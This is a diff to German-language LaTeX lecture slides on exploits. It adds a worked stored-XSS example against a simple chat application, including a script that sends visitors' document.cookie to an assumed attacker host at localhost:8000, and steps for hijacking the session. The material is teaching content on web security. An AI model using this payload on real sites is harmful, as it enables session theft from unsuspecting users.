@@ -246,7 +246,6 @@
 %----------------------------------------------------------------------------------------
 
 \section{Exploits}
-
 \begin{frame}[fragile]{Code Injection}
   Code Injection ist das ausnutzen von Bugs durch Eingabe von ungewollten Parametern, um dadurch die Ausf\"urung zu ver\"andern.
   \newline
@@ -388,6 +387,69 @@
     \item HTML-Metazeichen durch Zeichenreferenzen ersetzen, damit sie als normale Zeichen behandelt werden
     \item Sicher programmierte Anwendung sind Web Apllication Firewalls (WAF) vorzuziehen.
   \end{itemize}
+\end{frame}
+
+\begin{frame}[fragile]{XSS - Beispiel}
+  \begin{itemize}
+    \item Wir betrachten ein Beispiel, wie man ein User-session mit Hilfe des XSS ergreifen kann. 
+    \item Wir haben ein ganz einfacher Chat-interface und koennen mit Hilfe SQL-Injection als Admin einloggen.
+    \item Ziel: Diebstahl der Benutzersession, so dass es m\"oglich w\"are, in seinem Namen in den Chat zu schreiben 
+  \end{itemize}
+\end{frame}
+
+
+\begin{frame}[fragile]{XSS - Beispiel}
+  \begin{figure}[ht]
+      \centering
+      \includegraphics[width=\textwidth]{XSS-1.png}
+      \caption{Anfangszustand}
+      \label{fig:figure1}
+  \end{figure}
+\end{frame}
+
+\begin{frame}[fragile]{XSS - Beispiel}
+  \begin{itemize}
+    \item Wir verwenden die XSS-Sicherheitsl\"uck in Form, um unser eigenes Script in die Seite zu integrieren.
+    \item F\"ullen wir das Feld 'new message' wie folgt:
+
+    \begin{lstlisting}[style=PHPStyle]
+      Please no Offtop in this thread. 
+      <script>
+        img = new Image();
+        img.src = "http://localhost:8000/cat.jpg?"+document.cookie;
+      </script>
+    \end{lstlisting}
+    \item Annahme: das Zieladdress (http://localhost:8000) geh\"ort zum Angreifer.
+  \end{itemize}
+\end{frame}
+
+
+\begin{frame}[fragile]{XSS - Beispiel}
+  \begin{figure}[ht]
+      \centering
+      \includegraphics[width=\textwidth]{XSS-2.png}
+      \caption{Nach der Integration des Skripts}
+      \label{fig:figure2}
+  \end{figure}
+\end{frame}
+
+\begin{frame}[fragile]{XSS - Beispiel}
+  \begin{itemize}
+    \item Da die Website die Eingabe nicht \"uberpr\"uft, gelangt unser Skript in den Chat.
+    \item Ab jetzt jeder Besucher des Seites wird sein Cookies-data zum Angreifer senden.
+    \item Der Angreifer sollte, bis der richtige Benutzer die Seite aufruft.
+    \item Der Angreifer kann dann in seinem Browser Cookie-Werte ersetzen, so dass die Website ihn als Benutzer nimmt.
+  \end{itemize}
+\end{frame}
+
+
+\begin{frame}[fragile]{XSS - Beispiel}
+  \begin{figure}[ht]
+      \centering
+      \includegraphics[width=\textwidth]{XSS-3.png}
+      \caption{User's cookies in attacker's server logs}
+      \label{fig:figure3}
+  \end{figure}
 \end{frame}
 
 %----------------------------------------------------------------------------------------
